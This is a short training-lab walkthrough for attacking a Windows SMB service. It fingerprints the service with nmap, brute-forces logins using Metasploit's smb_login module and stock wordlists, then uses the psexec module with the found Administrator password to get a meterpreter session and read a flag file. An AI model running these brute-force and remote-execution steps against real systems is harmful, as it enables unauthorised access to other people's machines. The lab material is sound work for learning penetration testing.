# Windows : SMB Server PSexec

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2380–2414. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

Your task is to fingerprint the SMB service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. You need to find valid credentials to access the SMB service and abuse the service with available SMB Metasploit exploitation modules.

**Objective:** Exploit the SMB service to get a meterpreter session on the target and retrieve the flag!

Tools: Metasploit Framework, Nmap

```bash
nmap demo.ine.local
nmap -p445 --script smb-protocols demo.ine.local

msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit

msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit

shell
cd /
dir
type flag.txt
```
